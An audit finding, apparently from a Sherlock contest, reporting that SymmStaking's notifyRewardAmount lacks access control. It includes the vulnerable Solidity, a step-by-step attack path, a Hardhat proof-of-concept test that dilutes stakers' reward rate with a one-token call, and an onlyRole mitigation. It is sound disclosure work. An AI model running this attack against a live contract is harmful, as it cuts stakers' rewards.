# Missing Access Control on notifyRewardAmount Function Allows Reward Rate Manipulation

### Summary

Missing access control on the notifyRewardAmount function will cause a significant reduction in reward payouts for stakers as any user can dilute the reward rate by calling the function with minimal token amounts.

### Root Cause

In [SymmStaking.sol](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L275) the `notifyRewardAmount` function lacks the onlyRole(REWARD_MANAGER_ROLE) access control modifier, allowing any external user to call this function and manipulate reward rates.
```solidity
function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external nonReentrant whenNotPaused {
    _updateRewardsStates(address(0));
    if (tokens.length != amounts.length) revert ArraysMismatched();

    uint256 len = tokens.length;
    for (uint256 i = 0; i < len; i++) {
        address token = tokens[i];
        uint256 amount = amounts[i];

        if (amount == 0) continue;
        if (!isRewardToken[token]) revert TokenNotWhitelisted(token);

        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
        pendingRewards[token] += amount;
        _addRewardsForToken(token, amount);
    }
    emit RewardNotified(tokens, amounts);
}
```
The [_addRewardsForToken](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L366) function recalculates the reward rate and resets the reward period even when a very small amount is added, making it particularly vulnerable to manipulation:
```solidity
function _addRewardsForToken(address token, uint256 amount) internal {
    TokenRewardState storage state = rewardState[token];

    if (block.timestamp >= state.periodFinish) {
        state.rate = amount / state.duration;
    } else {
        uint256 remaining = state.periodFinish - block.timestamp;
        uint256 leftover = remaining * state.rate;
        state.rate = (amount + leftover) / state.duration; // @audit RATE CHANGED
    }

    state.lastUpdated = block.timestamp;
    state.periodFinish = block.timestamp + state.duration; // @audit PERIOD RESET
}
```

### Internal Pre-conditions

1. Admin needs at least whiteliste one reward token via configureRewardToken(token, true)


### External Pre-conditions

none

### Attack Path

1. Admin calls notifyRewardAmount with a legitimate reward amount (e.g., 6,048,000 tokens for a rate of 10 tokens/second)
2. User deposits tokens into the staking contract via the deposit function
3. After some time passes (e.g., 1 day), Attacker calls notifyRewardAmount with a minimal amount (e.g., 1 token)
4. This resets the distribution period to a full week but significantly dilutes the reward rate (e.g., from 10 to 8 tokens/second) as illustrated below with the POC
5. Attacker can repeat this process frequently to keep diluting rewards
6. When User claims rewards, they receive significantly less than expected at that time

### Impact

The staking users suffer an approximate loss of 20-30% of their expected rewards that should be getting at the same timestamp, each time the attack is executed. 
The attacker only needs to spend minimal amounts of reward tokens to execute this attack (as little as 1 token per manipulation).

This results in:

- Effective APY reduction of 20-30%
- Time value loss of rewards
- Predictability Issues: Users can't reliably predict their reward accrual rate, as any attacker can manipulate it

### PoC

```ts
		it("should be vulnerable to reward rate manipulation by non-admin users", async function () {
			// Get the reward duration first to ensure we scale rewards properly
			const rewardDuration = await symmStaking.DEFAULT_REWARDS_DURATION();
			console.log(`Reward duration is ${rewardDuration} seconds`);
			
			// Use a much larger reward amount to ensure the rate is not 0
			// For example, if duration is ~600,000 seconds (1 week), we use 6,000,000 tokens
			// This gives a rate of 10 tokens per second
			const rewardAmount = BigInt(rewardDuration) * BigInt(10);
			console.log(`Using reward amount of ${rewardAmount} tokens`);
			
			// Admin sets up the rewards
			await stakingToken.connect(admin).mint(admin.address, rewardAmount);
			await stakingToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount);
			await symmStaking.connect(admin).configureRewardToken(await stakingToken.getAddress(), true);
			await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [rewardAmount]);
			
			// Record initial reward rate
			const initialState = await symmStaking.rewardState(await stakingToken.getAddress());
			console.log(`Initial reward rate: ${initialState.rate} tokens per second`);
			
			// Verify the initial rate is greater than 0
			expect(initialState.rate).to.be.gt(0);
			
			// User deposits tokens
			const depositAmount = BigInt(rewardAmount) / BigInt(10); // 10% of the reward amount
			await stakingToken.connect(admin).mint(user1.address, depositAmount);
			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount);
			await symmStaking.connect(user1).deposit(depositAmount, user1.address);
			
			// Time passes - 1 day into the reward period
			await time.increase(86400); // 1 day
			
			// Calculate remaining rewards (approximately)
			const remainingRewardDuration = BigInt(rewardDuration) - BigInt(86400);
			const remainingRewards = BigInt(initialState.rate) * remainingRewardDuration;
			console.log(`Estimated remaining rewards: ${remainingRewards}`);
			
			// Attack with a small amount of rewards to manipulate the rate (this case with 1 token)
			const attackAmount = 1;
			console.log(`Attack amount: ${attackAmount}`);
			
			// User2 adds a small amount of rewards
			await stakingToken.connect(admin).mint(user2.address, attackAmount);
			await stakingToken.connect(user2).approve(await symmStaking.getAddress(), attackAmount);
			await symmStaking.connect(user2).notifyRewardAmount([await stakingToken.getAddress()], [attackAmount]);
			
			// Check manipulated state
			const attackState = await symmStaking.rewardState(await stakingToken.getAddress());
			console.log(`Manipulated reward rate: ${attackState.rate} tokens per second`);
			
			// Calculate rate reduction
			const rateReduction = initialState.rate - attackState.rate;
			console.log(`Rate reduction: ${rateReduction} tokens per second`);
			
			// Verify the manipulated rate is lower than the initial rate
			// Only run this check if the initial rate is greater than 0
			if (initialState.rate > 0) {
			  expect(attackState.rate).to.be.lt(initialState.rate);
			} else {
			  console.log("WARNING: Initial rate was 0, cannot verify rate reduction");
			}
			
			// Advance time to the end of what would have been the original period
			await time.increase(Number(rewardDuration));
			
			// User claims rewards
			const balanceBefore = await stakingToken.balanceOf(user1.address);
			await symmStaking.connect(user1).claimRewards();
			const balanceAfter = await stakingToken.balanceOf(user1.address);
			const actualRewards = balanceAfter - balanceBefore;
			
			console.log(`Actual rewards claimed: ${actualRewards} tokens`);
			
			// The vulnerability demonstration is complete - rate was manipulated
			console.log(`Demonstration complete - reward rate was successfully manipulated`);
		  });

### Mitigation

Add the onlyRole(REWARD_MANAGER_ROLE) modifier to the notifyRewardAmount function:
```solidity
function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) 
    external 
    nonReentrant 
    whenNotPaused
    onlyRole(REWARD_MANAGER_ROLE)  // Add this modifier
{
    // existing code
}
```
This ensures that only authorized accounts can modify reward rates, preventing reward manipulation by unauthorized users.
